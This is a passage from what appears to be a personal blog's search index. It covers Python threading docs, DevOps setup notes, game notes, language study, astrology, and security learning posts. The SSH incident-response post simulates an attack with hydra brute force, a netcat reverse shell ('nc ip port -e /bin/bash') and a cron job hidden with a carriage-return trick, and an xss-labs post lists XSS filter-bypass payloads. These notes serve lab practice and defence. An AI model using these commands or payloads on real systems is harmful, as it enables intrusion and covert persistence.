方法终结了（不管是正常的还是抛出未被处理的异常），就不是’存活的’。 is_alive() 方法用于检查线程是否存活。 其他线程可以调用一个线程的 join() 方法。这会阻塞调用该方法的线程，直到被调用 join() 方法的线程终结。 线程有名字。名字可以传递给构造函数，也可以通过 name 属性读取或者修改。 如果 run() 方法引发了异常，则会调用 threading.excepthook() 来处理它。 在默认情况下，threading.excepthook() 会静默地忽略 SystemExit。 一个线程可以被标记成一个“守护线程”。 这个标识的意义是，当剩下的线程都是守护线程时，整个 Python 程序将会退出。 初始值继承于创建线程。 这个标识可以通过 daemon 特征属性或者 daemon 构造器参数来设置。 备注：守护线程在程序关闭时会突然关闭。他们的资源（例如已经打开的文档，数据库事务等等）可能没有被正确释放。如果你想你的线程正常停止，设置他们成为非守护模式并且使用合适的信号机制，例如： Event。 有个 “主线程” 对象；这对应Python程序里面初始的控制线程。它不是一个守护线程。 创建“虚拟线程对象”是有可能的。 它们是与“外部线程”相对应 的线程对象，是在 threading 模块之外启动的控制线程，例如直接来自 C 代码。 虚拟线程对象的功能是受限的；它们总是会被视为处于激活和守护状态，且无法被 合并。 它们绝不会被删除，因为检测外部线程的终结是不可能做到的。 class threading.Thread(group&#x3D;None, target&#x3D;None, name&#x3D;None, args&#x3D;(), kwargs&#x3D;{}, *, daemon&#x3D;None)应当始终使用关键字参数调用此构造函数。 参数如下： group 应为 None；保留给将来实现 ThreadGroup 类的扩展使用。 target 是用于 run() 方法调用的可调用对象。默认是 None，表示不需要调用任何方法。 name 是线程名称。 在默认情况下，会以 “Thread-N“ 的形式构造唯一名称，其中 N 为一个较小的十进制数值，或是 “Thread-N (target)” 的形式，其中 “target” 为 target.__name__，如果指定了 target 参数的话。 args 是用于发起调用目标函数的参数列表或元组。 默认为 ()。 kwargs 是用于调用目标函数的关键字参数字典。默认是 &#123;&#125;。 如果不是 None，daemon 参数将显式地设置该线程是否为守护模式。 如果是 None (默认值)，线程将继承当前线程的守护模式属性。 如果子类型重载了构造函数，它一定要确保在做任何事前，先发起调用基类构造器(Thread.__init__())。 在 3.3 版本发生变更: 增加了 daemon 形参。 在 3.10 版本发生变更: 使用 target 名称，如果 name 参数被省略的话。 start() 开始线程活动。 它在一个线程里最多只能被调用一次。 它安排对象的 run() 方法在一个独立的控制线程中被调用。 如果同一个线程对象中调用这个方法的次数大于一次，会抛出 RuntimeError 。 run() 代表线程活动的方法。 你可以在子类型里重载这个方法。 标准的 run() 方法会对作为 target 参数传递给该对象构造器的可调用对象（如果存在）发起调用，并附带从 args 和 kwargs 参数分别获取的位置和关键字参数。 使用列表或元组作为传给 Thread 的 args 参数可以达成同样的效果。 示例： 1234567&gt;&gt;&gt; from threading import Thread&gt;&gt;&gt; t = Thread(target=print, args=[1])&gt;&gt;&gt; t.run()1&gt;&gt;&gt; t = Thread(target=print, args=(1,))&gt;&gt;&gt; t.run()1 textwrap — 文本自动换行与填充textwrap — 文本自动换行与填充 — Python 3.12.5 文档","tags":["tools","devolop","python","nc"],"categories":["Tools","Tools Implementation"]},{"title":"03 应急响应-SSH爆破","path":"/2024/07/19/红蓝攻防/03SSH爆破/","content":"SSH是什么？ 安全外壳协议：SSH（Secure Shell），加密网络传输协议 用途：远程登陆系统 Xshell、Moba 常见端口对应服务 22——SSH 445——smb——ms17-010（永恒之蓝） 3306——mysql 3389——rdp远程桌面连接服务 80——http 443——https 模拟SSH爆破攻击1、信息收集：nmap 2、尝试爆破：hydra进行爆破，hydra -L ysers.txt -P password.txt ssh://ip 撞库：别的网站的字典 3、登录：ssh username@ip 4、尝试创建隐藏计划任务（权限维持） 进入 /tmp 目录创建task.sh文件 12 #！/bin/bash nc ip地址 端口 -e /bin/bash 创建create_task.sh 1(crontab -l;printf &quot;***** /tmp/task.sh;\\rno crontw-wab for &#x27;whoami&#x27;%100c &quot;)|crontab - chmod +x create_task.sh 执行：./create_task.sh 5、尝试nc连接目标主机的shell nc -lvp 端口 SSH爆破应急响应netstat -antpl列出系统上所有的网络套接字连接情况，看ip，本机可疑，有bash很可疑 pstree -p看一下进程树，找bash systemctl status 进程号观察可疑文件具体是什么 cat -A /var/spool/cron/crontabs/root查看计划任务 找到文件路径 ls -l 文件路径查看文件属性信息，上传时间，权限 cat 文件路径查看文件写了什么 last -f /var/log/wtmp查看登录日志溯源 查看登录成功的日志： last -f /var/log/wtmp 找到攻击者ip 查看登录失败的日志：last -f /var/log/btmp 如果登陆失败日志很多则表示被爆破 crontab -r -u root删除隐藏的计划任务 然后再次查看一下：cat -A /var/spool/cron/crontabs/root kill 恶意进程号杀掉恶意进程 rm 恶意文件进入目录删除恶意文件 passwd root修改root密码 vim /etc/ssh/sshd_config修改ssh默认端口 关闭root用户远程连接的权限：修改PermitRootLogin为no，增强权限控制","tags":["Emergency Response","Blue"],"categories":["Emergency Response"]},{"title":"game-screeps","path":"/2024/07/18/杂/game-screeps/","content":"项目：python_screeps_arena: 这个项目是为了希望使用 Python 玩 Screeps: Arena 的玩家准备的。该项目提供了一个“标准库”（std.py）作为 js 和 python 之间的粘合层。玩家在 main.py 的loop中编写自己的逻辑代码，然后运行 build.py 生成 main.mjs。 - Gitee.com 文档：std.md · EagleBaby&#x2F;python_screeps_arena - Gitee.com","tags":["game"],"categories":["Game"]},{"title":"02 应急响应-入侵排查","path":"/2024/07/16/红蓝攻防/02入侵排查/","content":"系统排查-基本信息（windows）win: msinfo32.exe使用Microsoft 系统信息工具(msinfo32.exe)，它是Microsoft Windows NT诊断工具(Winmsd.exe)的更新版本 。 cmd：输入msinfo32命令，打开系统摘要信息窗口。 正在运行的任务：系统摘要-&gt;软件环境-&gt;正在运行的任务，可以看到正在运行的任务名称、路径、进程ID等信息。 服务：在系统摘要-&gt;软件环境-&gt;服务选项，查看服务的名称、状态、路径等信息。 系统驱动程序：软件环境-&gt;系统驱动程序，可以查看系统驱动程序的名称、描述、文件等信息。 加载的模块：软件环境-&gt;加载的模块，查看加载的模块的名称、路径等信息。 启动程序：软件环境 -&gt;启动程序，查看启动程序的命令、用户名、位置等信息。 还可以使用systeminfo命令查看简要信息。 linux: lscpu, uname -a, lsmod系统排查-用户信息（windows）windows排查恶意账户命令行：net user查看用户，但是隐藏用户依然看不见 图形界面在计算机管理-&gt;本地用户和组-&gt;用户中查看，可以查看隐藏账户，名称以$结尾 注册表查看运行中输入regedit，打开注册表编辑器，在HKEY_LOCAL_MACHINE下的SAM 选项，可以访问到子项并查看用户信息，查看是否存在隐藏克隆账户 wmicwmic useraccount get name,sid linux排查恶意账户cat &#x2F;etc&#x2F;passwd 查看所有用户信息root : x : 0 : 0 : root : /root : /usr/bin/zsh 用户名 ：密码加密：用户id：用户组id：用户主家目录：默认登陆的shell 最后显示bin/bash表示账户状态可登录，如果为sbin/nologin，表示账户状态不可登录 分析超级权限账户查询可登录账户UID为0的账户，root是UID为0的可登录账户，如果出现其它为0的账户，就要重点排查: awk -F: &#39;&#123;if($3==0)print $1&#125;&#39; /etc/passwd （以冒号分隔，如果第三个位置等于0，打印第一个位置的内容） cat&#x2F;etc&#x2F;passwd | grep ‘bin&#x2F;bash’ 查看可登录的账户lastb 查看用户错误的登录信息lastlog 查看所有用户最后的登录时间last 查看用户最近登录信息数据源为&#x2F;var&#x2F;log&#x2F;wtmp、&#x2F;var&#x2F;log&#x2F;btmp、&#x2F;var&#x2F;log&#x2F;utmp wtmp存放登录成功的信息，btmp存放登录失败的信息，utmp存放正在登录的信息 who 查看当前用户登录系统情况系统排查-启动项（windows）msconfig 注册表以分层的组织形式存储数据元素，数据项是注册表的基本元素，每个数据项下面不但可以存储很多子数据项，还可以以键值的形式存储数据。 HKEY CLASSES_ROOT (HKCR)此处存放信息可确保windows资源管理器中执行时打开正确的程序，还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息 HKEY_CURRENT_USER(HKCU)包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板的设置 HKEY LOCAL_MACHINE(HKLM)包含运行操作系统的计算机硬件特定的信息，有系统上安装的驱动器列表以及已安装硬件和应用程序的通用配置 HKEY_USERS(HKU)包含系统上所有用户配置文件的配置信息，有应用程序配置和可视化设置 HKEY CURRENT CONFIG(HCU):存储有关系统当前配置的信息 系统排查-启动项（Linux）启动项是恶意病毒实现持久化的常用手段 cat &#x2F;etc&#x2F;init.d&#x2F;rc.localcat &#x2F;etc&#x2F;rc.localls -alt &#x2F;etc&#x2F;init.d系统排查-计划任务（windows）计算机管理-&gt;系统工具-&gt;任务计划程序-&gt;任务计划程序库 查看任务计划名称、状态、触发器等信息 powershell: Get-ScheduledTask 本地Administrators成员：schtasks 系统排查-计划任务（Linux）crontab -l crontab -u root -l 查看&#x2F;etc目录下的任务计划文件：ls /etc/cron* 其他参考资料Linux&amp;Windows应急响应+案例分析 (2024HW必备)-Hacking红黑白","tags":["Emergency Response","Blue"],"categories":["Emergency Response"]},{"title":"Source Control-GitLab, SonarQube and Gerrit","path":"/2024/07/15/杂/SourceControl/","content":"GitLabI personally use GitHub, and I use GitLab for work because they usually work in an internal network environment, and GitLab supports configuration on internal network servers. The following is the process of installing and building GitLab on my own Linux system. 我个人使用的是GitHub，工作中使用的是GitLab，因为他们平常工作环境都在内网中，而GitLab支持在内网服务器搭配配置。下面是我在自己在Linux系统上安装搭建的GitLab的过程。 Overall Architecture图 Ⅰ Installation StepsI installed it on my own virtual machine, and the system is KylinServerV10SP1. 我是在自己的虚拟机上安装，系统是KylinServerV10SP1。 1 Install Dependencies1yum -y install openssh-server openssh-clients postfix cronie curl Then I found out that it had already been installed. 2 Download PackageVersion reference: gitlab&#x2F;gitlab-ce - Packages · packages.gitlab.com Please note that you need to download the el8 version. 1wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/el/8/gitlab-ce-16.11.6-ce.0.el8.x86_64.rpm/download.rpm 3 Install Gitlab1sudo yum install gitlab-ce-16.11.6-ce.0.el8.x86_64 4 Configure External Access Connection12345ifconfigvim /etc/gitlab/gitlab.rbexternal_url&#x27;http://192.168.152.133/&#x27; 5 Modify Service Port 6 RecofigureOverload configuration and initialize all configurations. Make the modified configuration take effect immediately. 重载配置，初始化所有配置。使修改后的配置立即生效。 1gitlab-ctl reconfigure 7 Stop, Start, Restart, Status Command1234gitlab-ctl stopgitlab-ctl startgitlab-ctl restartgitlab-ctl status 8 View Log1gitlab-ctl tail 9 Password1cat /etc/gitlab/initial_root_password root login: 10 Open PortSearch for ‘listen’ in the configuration file, modify socket port. 11 Access12 OtherGitLab Documentation GitLab使用技巧-GitLab中文网站 一文掌握：Gitlab的完整使用手册-阿里云开发者社区一文掌握：Gitlab的完整使用手册-阿里云开发者社区 Ⅱ Configure Gitlab1 Configure Email SMTPGenerally, there is a dedicated SMTP for internal networks. SMTP settings | GitLab 2 Open LDAP Integrate LDAP with GitLab | GitLab 3 Backup and Restore gitlab.rb gitlab-secrets.json Backup | GitLab 4 Configure Git Storage Repository DirectorySonarQubeBecause my computer performance is average and the virtual machine cannot be moved, all subsequent operations will be completed in my physical machine (Win11) environment. 由于我的计算机性能一般，虚拟机无法移动，因此所有后续操作都将在我的物理机（Win11）环境中完成。 Introduction SonarQube is an open platform for managing code quality It can quickly locate potential or obvious errors in the code. At present, it supports code quality management and detection for more than 20 programming languages such as Java, C #, C&#x2F;C++, Python, PL&#x2F;SQL, Cobol, JavaScript, Groovy, etc. Integrate Jenkins and DevOps for CI&#x2F;CD work. Seven dimensions to check code quality Complexity distribution: If the code is too complex, it will be difficult to understand Duplicate code: The program contains a large amount of copied and pasted code, resulting in bloated code. Sonar can display areas with severe duplication in the source code Unit tests statistics: Statistics and displays the coverage of unit tests, allowing developers or testers to clearly understand the coverage of test code Code rules check: Check whether the code complies with specifications through Findbugs, PMD, CheckStyle, etc Comment rate: If there are too few code comments, especially after personnel changes, it is difficult for others to take over; If there are too many, it is not conducive to reading Potential bugs: Detecting potential bugs through Findbugs, PMD, CheckStyle, etc Architecture&amp;design: Identify loops, display dependencies between packages and classes, and check coupling between programs Ⅰ Installationhttps://www.sonarsource.com/products/sonarqube/ 初体验Sonar10.6 之 从部署到实战-WinFrom控件库|.net开源控件库|HZHControls官网 Environment: JDK17, PostgreSQL 12 PostgreSQL 11 or greater sonarqube配置postgresql数据库 PostgreSQL 12.2 手册 SonarScanner CLI Ⅱ analysis如何使用sonar在本地对代码进行扫描？ - bingo彬哥 - 博客园 sonarqube使用教程 - 吕林光 - 博客园 Devops——Sonarqube+github构建_github 集成 sonarqube-CSDN博客 GerritGerrit is usually located in the front layer of the final code repository, used for manual code review and validation of CI task triggers. Usually integrated with GitLab. It can also be integrated with Jenkins. gerrit一般位于最终代码仓库的前一层，用于代码的人工审核和对CI任务的触发进行验证。通常和gitlab集成。它也可以与Jenkins集成。","tags":["CI","testing","Source Control"],"categories":["DevOps","CI/CD"]},{"title":"01 应急响应-概念","path":"/2024/07/14/红蓝攻防/01EmergencyResponse/","content":"事件级别红色 1 特别重大 橙色 2 重大 黄色 3 较大 蓝色 4 一般 事件类型1、应用安全 Webshell、网页篡改（2001中美黑客大战）、网页挂马 2、系统安全 勒索病毒、挖矿木马、远控后门 批量、0day、1day；漏洞：redis未授权、struts2、ssh爆破 3、网络安全 DDOS攻击、ARP攻击、流量劫持 4、数据安全数据泄露、损坏、加密 微盟事件：rm -rf 如何做应急响应1、确定攻击时间 缩小应急响应范围，有助于提高效率 2、查找攻击线索 能够知道攻击者做了什么事情 3、梳理攻击流程 还原整个攻击场景 4、实施解决方案 修复漏洞，切断攻击途径 5、定位攻击者 溯源取证 tg社工库 应急响应模型 （PDCERF）1 准备 Preparation 应急团队建设 应急方案制订 渗透测试评估 安全基线检查 2 检查 Detection 判断事件类型 判断事件级别 确定应急方案 3 抑制 Containment 限制攻击&#x2F;破坏波及的范围，同时也是在降低潜在的损失： 阻断：IP地址、网络连接、危险主机 关闭：可疑进程、可疑服务 删除：违规账号、危险文件 4 根除 Eradication 通过事件分析找出根源并彻底删除： 增强：安全策略、全网监控 修复：应用漏洞、系统漏洞、补丁更新 还原：操作系统、业务系统 5 恢复 Recovery 恢复业务系统 恢复用户数据 恢复网络通信 6 总结 Follow-up 事件会议总结 响应报告输出 响应工作优化 应急响应团队组建内部团队监控组 利用各类系统监控、查看监控日志、对应用&#x2F;系统&#x2F;网络&#x2F;数据安全检测 响应组 应用组、系统组、设备组 研判组 溯源分析、专家组 文档组 应急响应方案指定、实践报告输出、经验总结输出 外部团队合作单位 安全厂商、安全服务团队 监管单位 网信办、公安部 安全产品美国分类9类 鉴别、访问控制、入侵检测、防火墙、公钥基础设施、二姨程序代码防护、漏洞扫描、取证、介质清理或擦除 中国公安部7类 操作系统安全、数据库安全、网络安全、病毒防护、访问控制、加密、鉴别 产品用途分类安全网关类 防火墙、UTM、网闸、抗DDOS墙、VPN、上网行为管理 评估工具类 漏扫系统、网络分析系统 威胁管理 入侵检测系统（IDS）、入侵防御系统（IPS）、WAF 应用监管类 堡垒机、评审系统、终端安全管理系统、安全运维平台（SOC） 安全加密类 加密机、三合一","tags":["Emergency Response","Blue"],"categories":["Emergency Response"]},{"title":"xss-labs","path":"/2024/07/14/靶场/xss-labs/","content":"第一关没有任何防范 1&lt;script&gt;alert()&lt;/script&gt; 第二关可以看到在h2标签这里他将&lt;和&gt;进行了编码，而在输入这个标签中，她是没有被编码的，但是可以看到我们的注入语句被放到了value值当中，这样浏览器是不会执行我们注入的语句的，所以构造闭合思路。 1&#x27;&quot;&gt;&lt;script&gt;alert()&lt;/script&gt; 第三关可以看到内容在input标签中输出了，那么可以尝试闭合input标签的value属性，加上onfocus事件或者onblur事件，onfocus事件会一直弹框。 123&#x27; onfocus=&#x27;alert(121)&#x27;&#x27; onblur=&#x27;alert()&#x27;&#x27; onBlur=javascript:alert(&#x27;世界马上要毁灭了&#x27;) 第四关发现单引号不能闭合input标签的value属性对应值的引号，所以再加一个双引号来闭合 1&#x27; onfocus=&#x27;alert(121)&#x27; 第五关on事件被过滤了，中间加了个_ ，换成a标签 1&#x27;&quot;&gt;&lt;a href=&#x27;javascript:alert(111)&#x27;&gt;点这里&lt;/a&gt; 第六关href属性被过滤了，换成大写或大小写混合 1&#x27;&quot;&gt;&lt;a HREF=&#x27;javascript:alert(111)&#x27;&gt;点这里&lt;/a&gt; 第七关双写 1&#x27;&quot;&gt;&lt;a HRhrefEF=&#x27;javascriscriptpt:alert(111)&#x27;&gt;点这里&lt;/a&gt; 第八关只有在属性值的时候可以用编码，Unicode转换成其他编码ASCII 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#49;&amp;#49;&amp;#49;&amp;#39;&amp;#41; 第九关对http://可以输出，注释掉就好，并且javascript加了杠，所以转义 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(111)//http:// 第十关","tags":["靶场","xss"],"categories":["Range","xsslabs"]},{"title":"CI/CD","path":"/2024/07/10/杂/CI-CD/","content":"1&lt;embed src=&quot;./7thCS50.pdf&quot; width=&quot;100%&quot; height=&quot;750&quot; type=&quot;application/pdf&quot;&gt;","tags":["笔记","CI","CD","测试"],"categories":["杂"]},{"title":"game-greyhack","path":"/2024/06/30/杂/game-greyhack/","content":"ch1 network onlineTerminal Programs &gt; Network Commands category in the following order: airmon Usage: airmon [start:stop] [net interface]Example: airmon start wlan0 Used to enable &#x3D;&#x3D;monitor mode&#x3D;&#x3D; on wireless interfaces.It may also be used to go back from &#x3D;&#x3D;monitor mode&#x3D;&#x3D; to &#x3D;&#x3D;managed mode&#x3D;&#x3D;.Entering the airmon command without parameters will show the interfaces status. It is the first step to be able to get the connection &#x3D;&#x3D;password&#x3D;&#x3D; of a wifi router. The network card needs to be activated in &#x3D;&#x3D;monitor mode&#x3D;&#x3D;. 12345678910111213141516//command: airmoncryptools = include_lib(&quot;/lib/crypto.so&quot;)if not cryptools then exit(&quot;Error: Missing crypto library&quot;)if params.len &gt; 0 and (params.len != 2 or params[0] == &quot;-h&quot; or params[0] == &quot;--help&quot;) then exit(command_info(&quot;airmon_usage&quot;))computer = get_shell.host_computerformatOutput = &quot;Interface Chipset Monitor_Mode &quot;if params.len == 0 then exit(format_columns(formatOutput + computer.network_devices))option = params[0]device = params[1]if option != &quot;start&quot; and option != &quot;stop&quot; then exit(command_info(&quot;airmon_usage&quot;))output = cryptools.airmon(option, device)if not output then exit(&quot;airmon: &quot; + device + &quot; not found&quot;)if typeof(output) == &quot;string&quot; then exit(output)print(format_columns(formatOutput + computer.network_devices)) iwlist Usage: iwlist [net device]Example: iwlist wlan0 Shows the list of wifi networks visible from your computer. [Usage Details] Once the iwlist command is executed the output will show something similar to this:&#x3D;&#x3D;BSSID PWR ESSID&#x3D;&#x3D;&#x3D;&#x3D;14:C7:E5:46:D9:F5 65% corpdevice&#x3D;&#x3D; &#x3D;&#x3D;BSSID&#x3D;&#x3D; is the identifier of the device.&#x3D;&#x3D;PWR&#x3D;&#x3D; is the coverage that reaches the Wi-Fi network installed in your PC in a range of 0% to 100%. The higher this number is, the closer your device is to your location and you can capture the packets faster.&#x3D;&#x3D;ESSID&#x3D;&#x3D; is the name of the router access point. aireplay aircrack","tags":["game"],"categories":["Game"]},{"title":"game-ShenZhenI/O","path":"/2024/06/29/杂/游戏笔记-深圳I-O/","content":"Walkthrough：https://steamcommunity.com/sharedfiles/filedetails/?id=780661614 第一关 安全摄像头这关很简单。按照示例基本可以猜个八九不离十。 slp：让CPU进入sleep状态，规定睡眠时间单元。 mov：真实指令。数据传送。 1234mov 100 p1 #向引脚p1发送方波slp 3 #前3个时间单元内为100状态mov 0 p1slp 3 12345678910#傻瓜算法-设计1#成本6元，60用电量，12代码行。mov 0 p0slp 4mov 100 p0slp 2mov 0 p0 slp 1mov 100 p0slp 1 第二关 工厂模型替换件看了一下输入输出波，第一关那种设计1傻瓜移跳完全不得行了，那要到上百行里去了。 acc：主存储器，可以存储-999~999的整数。内部计算。所有数学计算都将 使用并修改 acc 的值。 mul：将第一个操作数的值与 acc 存储器的值相乘，并将结果存入 acc 存储器。 提示：将控制输入的信号值乘以2以后，复制到控制输出。步进可以观察acc中的数值以及控制输入输出的数值，有助于理解。 12345#设计1-成本3，240用电量，4代码行mov p0 acc #将p0输入信号存储在acc存储器中mul 2 #将2与acc存储器中的数值相乘，并将结果存入acc中。mov acc p1 #将acc的值发送到p1控制输出。slp 1 #推进时间1 娱乐时间：解锁纸牌游戏哈哈哈哈哈哈，摸鱼，启动！ 啊啊啊，感觉很复杂，完全没有头绪呢….这游戏中的游戏真的能通关吗？ 目前思路： 开场先观察中发空哪个好露出。然后开始凑牌。 局势不对重开！重开！ 和羊了个羊一样每局不一定有解 把1先挪上去，开始凑花色 6月30号第一次纸牌胜利 第三关 诊断脉冲生成器提示：有条件执行结构。根据按钮的输入不同，脉冲输出也不同。 teq：测试第一个操作数 (A) 是否等于第二个操作数 (B) 的值 条件 对‘+’ 指令的作用 对‘-’ 指令的作用 A 等于 B 允许执行 禁止执行 A 不等于 B 禁止执行 允许执行 答案不唯一。 观察脉冲，发现未按按钮（p0&#x3D;0）输出p1也为0；按下按钮时，形成10波。 1234567891011121314151617#设计1-成本3，164用电量，7代码行 teq p0 100 + mov 100 p1 + slp 1+ mov 0 p1+ slp 1- mov 0 p1- slp 1#新设计2-同上，无差别 teq p0 0+ mov 0 p1+ slp 1- mov 100 p1- slp 1- mov 0 p1- slp 1 第四关 动画ESPORSTS标志换音乐了！不错！带感！ 全部都是简单输出，那么就是说明所有简单IO引脚都可以用作输出。 123456789101112131415161718192021222324252627282930#设计1 喝0与-1连接。成本11，215用电量，24代码行。#点击1与点击2 mov 100 p0 mov 0 p1 slp 1 mov 0 p0 mov 100 p1 slp 1#喝0与-1部分（这里如果0与-2写一起，可以节省代码行使用小芯片节省成本） mov 100 p0 mov 0 p1 slp 6 mov 0 p0 mov 100 p1 slp 1 mov 0 p1 mov 0 p0 slp 2 mov 0 p0 mov 100 p1 slp 1#喝2部分 mov 0 p0 slp 7 mov 100 p0 slp 2 mov 0 p0 slp 1 12345678910111213141516171819202122232425262728293031#设计2 喝0与-2连接。成本9，电量使用211，代码行23#点击1与点击2与设，计1无区别。 mov 100 p0 mov 0 p1 slp 1 mov 0 p0 mov 100 p1 slp 1#喝0与-2部分 mov 100 p0 mov 0 p1 slp 6 mov 0 p0 #p1为0默认不改变，不提及，继续往前1 slp 1 mov 100 p1 slp 2 mov 0 p1 #p0为0默认不改变，不提及，继续往前1 slp 1#喝1部分 mov 0 p0 slp 6 mov 100 p0 slp 1 mov 0 p0 slp 2 mov 100 p0 slp 1 加入反相器！超强优化！ 反相器：这个器件可以将输入信号的相位反转180°。反相器是最简单的门电路，它只有一个输入端和一个输出端，输入和输出都只有高电位和低电位(在数字电路中称之为高电平和低电平)两种相反的状态，如果高电平用“1”表示，低电平用“0”表示，反相器输出与输入之间特定的逻辑关系就是“输入为1，则输出为0；输入为0，则输出为1”，输出总是输入的否定，所以反相器称为“非门”。 输出表 A输入 B输出 反相器LC70G04 0 0 1 0 1 1 1 0 0 1 1 0 1#设计3 加入反相器。","tags":["game"],"categories":["Game"]},{"title":"English Reading Plan","path":"/2024/06/06/阅读/英语原著计划与生词/","content":"Boogiepop Returns VS Imaginator 2024.06.29 已经阅读完一半了，都是比较简单的句子。是日语翻译成英文的版本。 今年到六月初看了37本纸质课外书，之后打算加强英语学习。尽量阅读英文的小说或者书本。大概七月前就能看完这本书吧，薄薄的内容也不长，剧情非常有趣，已经看过很多遍了。 已读完。 the code book","tags":["read","english"],"categories":["Read"]},{"title":"德语自学","path":"/2024/02/03/胡言乱语/德语自学/","content":"入门材料：【【德语零基础】迅速入门德语必看！珍妮老师的德语课堂第一部分，英德双语教学，简单实用易会】 https://www.bilibili.com/video/BV1m7411H7dd/?share_source=copy_web&amp;vd_source=d5530a28532a2f6243f002dbc6b3fb4a 2024&#x2F;2&#x2F;3 01课ja (yes) nein (no) vielleicht (maybe) der(masculine article)-die(feminine article)-das(neutral article) (the) das Auto (the car) wo (where) Wo ist das Auto? (Where is the car?) ich (I) Ich lerne Deutsch. (I’ m learning&#x2F;studying German.) lernen (to learn) der Mann (the man) die Frau (the woman) im Auto (in the car) im &#x3D; in dem Der Mann ist im Auto. (The man is in the car.) Die Frau im Auto. (The woman is in the car.)","tags":["语言","学习","德语"],"categories":["碎碎念"]},{"title":"玄学笔记","path":"/2024/01/22/阅读/玄学笔记/","content":"西方占星术🚩《内在的天空》——本命盘占星学的七大原则——进化占星学 占星符号都是中性的，没有好的，也没有坏的。 每个人应该为自己如何去体现自己的星盘而负责。 没有一个占星师能够仅仅通过星盘来判定一个人会如何地展现他的星盘。 星盘是一个人可能达到的最快乐、最满足、最灵性、最富有创造性的成长之路的蓝图。 所有对这个理想成长模式的偏离都是不稳定状态，通常都会带来一种无目的感、空虚、以及焦虑。 占星学里只有两点是绝对的：生命本身所拥有的不可去除的神秘性；以及每个个体对这种神秘性的独特看法。 当占星学跟任何一种哲学或者宗教结合得太紧密时，它就受到了损害。在占星学系统中，除了一个人的自我意识，没有什么是真正重要的。 这七个原则都很基本。去掉任何一个，或者扭曲任何一个都会让整栋建筑轰然倒下，沦为算命。 我们是自由的。宇宙的力量和人类意志共同以一种敞开、共时的方式运作。它们之间的结合所造成的结果无法被预测，就象一个孩子的性格无法通过了解他的父母来断定一样。 一切都归结于此：占星象征是动词，而不是名词。我并不是一个摩羯座，我正在成为一个摩羯座。成长、改变、进化，这就是占星的核心。把宿命主义和僵化留给那些算命先生吧，我们的工作不是这些。 行星落入星座和宫位的含义——基本词汇行星是“什么” 星座是“怎样”和“为什么” 宫位问的是一个最实际的问题：“哪里”？ 每一个宫位都是一个独特的战场，每一个都代表一个人生活中的一个部门，他可以在其中做出选择。每一个宫位也是一个固定的现实，在其中有一些给定的模式。一个确定的地貌。我们可以爬山，也可以选择进入山谷。但是不管多大的意愿也无法将这个地方变成平地。 我们要永远记住，一个宫位只是意识可以进入并且表现自己的领域。这些领域有些是可见的，有些则不可见。它们还是能够回答 “哪里 ”的问题。 五个步骤 第一步：看行星。我们所考虑的什么心识功能？我们在说心识的哪个部份？是太阳的自我形成？还是土星的纪律建立？ 第二步：看星座。它是在驱动这颗行星的东西。那个行星功能在寻求什么？它的行动之下是“为什么”？它隐藏的动机是什么？只有星座能够告诉我们这一点。我们在这里所得到的是一种目的感。进化的方向。如果我们所解读出来的话显得非常的分散和漫无目的，那么我们很可能是没有做好第二步。 第三步：想一想，这个“行星－星座”组合怎样完成它的目标？星座提供了哪些相关的资源？行星呢？你可能会需要去查一查星座章节里的资源部份或者行星章节里的功能部份。如果你是这个人，你拥有这些长处和责任，你会如何去得到幸福呢？ 第四步想一想，这个“行星－星座”组合可能会被怎样地扭曲？哪种行为会跟这个碎片的意义一致但是跟它的进化目的不一致？如果你不确定，可以查看星座章节里的阴影以及行星章节里的可能发展出的缺点。请记住，以一种警告的方式来呈现这些可能缺点，而不是以预言的方式。 第五步看宫位。这个“行星－星座”的事务会在哪里发展？它们会创造出什么样的行为？如果对这个“行星－星座”进行一个强的反应的话，在这个人生活的哪个部份会产生一些境遇的改进？ 我们必须以一种整合的方式来思考。 相位——语法和句法 如果说星座、行星、和宫位是占星语言中的基本词汇，那么相位就是描述这些词语必须怎样组合在一起的语法和句法。 传统的占星师们将相位分为两种：好和坏。这两个词从来不会给我们带来清晰的占星思考。所有的相位都是功能性的，每一个都有其目的。有些感觉起来比另一些舒服，但那是次要的。常常是那些感觉最好的相位让我们陷入最糟的困境。将好和坏从你的思考中去掉，至少从你的占星思考中去掉。让我们从功能的角度来看一看这些相位，而不是从它们是容易或者困难的角度去看。 零度：相合当两颗行星彼此重叠时，就是相合。 融合。 在相合相位中，两种通常是分开和独立的功能，会融合在一起。如果不启动其中的一个，另一个不可能运作。 180度：相冲拉扯。 如果一个出生星盘里有这个相冲相位的人能够同时将这两极都放进意识，让它们达成相互妥协，那么他或者她的生活将变丰富得多。 适应良好：弹性、变化、和适应性 适应不好：内耗、拉扯、一事无成 星盘中相对的那些星座。 90度：相刑摩擦。 相冲要更加和谐。 相刑的两个星座没有任何相互理解的基础。 相刑就是天敌之间的相位。 目的：进化。 这个相位所制造的摩擦会给行星带来无情的进化压力。 适应良好：焦虑带来成长。 适应不好：杀死另一个，缺失，残废。 120度：三合和谐。 自然的盟友。 但仍然需要点燃。 内在和谐——这是三合的长处和弱点。被这个相位所连接的行星彼此之间不会有冲突。但是冲突并不一定是坏的，有时它会孕育出均衡和好的判断力。 让行星缺乏审视自己的视角。 拥有无尽成长潜能。 我们必须想象有什么力量沉睡在这相位之中，然后以意识和自律的行动来释放它们。 适应良好： 适应不好：没有动力、懒惰、自我满足 找出三合相的技巧在于记住星座的元素。所有的火象星座彼此三合。所有土象，风象，水象星座也一样。 60度：六合兴奋、激发。 一个打折的三合相位。 被激发而进入了运作状态。 六合跟三合一样，很难看到自己。 适应良好：带我们走得更远，并且以更少的努力做到这一点。 适应不好：多彩，戏剧化，但是毫无用处。 次要相位在其他的天空中有详解。 容许度 准确的相位是最有力的，但是一个偏差 2、3度的相位也非常充满能量。 5度的话，也还很强，不能忽略。 6到 7度的话，也还有效，但是效果肯定减弱了。 8或者 9度的话，还有一点效果但是非常微弱，这时候我们可以保险地将注意力放在别处了。如果是关于太阳或者月亮的容许度，那么还可以加上一两度。 我们所考虑的这个位置的前后8度以内。 守护行星有些行星会比其它一些更有助于一些星座特质的表达。 